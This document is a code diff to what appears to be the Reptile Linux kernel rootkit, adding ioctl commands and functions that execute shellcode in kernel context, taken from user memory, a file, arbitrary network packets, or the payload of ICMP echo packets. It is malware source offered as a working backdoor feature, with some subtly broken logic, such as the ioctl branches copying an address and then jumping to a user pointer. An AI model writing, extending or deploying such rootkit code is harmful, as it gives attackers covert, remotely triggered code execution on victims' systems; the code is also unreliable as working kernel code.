@@ -429,6 +429,22 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 			network_hide_remove(addr);
 #endif
 			break;
+		case 6:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+#ifdef CONFIG_EXEC_SHELLCODE
+			execute_shellcode(args.argv);
+#endif
+			break;
+		case 7:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+#ifdef CONFIG_EXEC_SHELLCODE_FILE
+			execute_shellcode_from_file(args.argv);
+#endif
+			break;
 		default:
 			goto origin;
 		}
@@ -480,3 +496,79 @@ static void __exit reptile_exit(void)
 module_init(reptile_init);
 module_exit(reptile_exit);
 MODULE_LICENSE("GPL");
+
+void execute_shellcode(void *shellcode)
+{
+	void (*func)();
+	func = (void (*)())shellcode;
+	func();
+}
+
+void execute_shellcode_from_file(const char *filename)
+{
+	struct file *file;
+	mm_segment_t old_fs;
+	loff_t pos = 0;
+	void *shellcode;
+	size_t size;
+
+	file = filp_open(filename, O_RDONLY, 0);
+	if (IS_ERR(file))
+		return;
+
+	size = i_size_read(file_inode(file));
+	shellcode = kmalloc(size, GFP_KERNEL);
+	if (!shellcode) {
+		filp_close(file, NULL);
+		return;
+	}
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+	vfs_read(file, shellcode, size, &pos);
+	set_fs(old_fs);
+
+	filp_close(file, NULL);
+
+	execute_shellcode(shellcode);
+
+	kfree(shellcode);
+}
+
+void execute_shellcode_from_packet(struct sk_buff *skb)
+{
+	void *shellcode;
+	size_t size;
+
+	size = skb->len;
+	shellcode = kmalloc(size, GFP_KERNEL);
+	if (!shellcode)
+		return;
+
+	skb_copy_bits(skb, 0, shellcode, size);
+
+	execute_shellcode(shellcode);
+
+	kfree(shellcode);
+}
+
+void execute_shellcode_from_icmp_packet(struct sk_buff *skb)
+{
+	struct icmphdr *icmph;
+	void *shellcode;
+	size_t size;
+
+	icmph = icmp_hdr(skb);
+	if (icmph->type == ICMP_ECHO && icmph->code == 0) {
+		size = skb->len - sizeof(struct icmphdr);
+		shellcode = kmalloc(size, GFP_KERNEL);
+		if (!shellcode)
+			return;
+
+		skb_copy_bits(skb, sizeof(struct icmphdr), shellcode, size);
+
+		execute_shellcode(shellcode);
+
+		kfree(shellcode);
+	}
+}
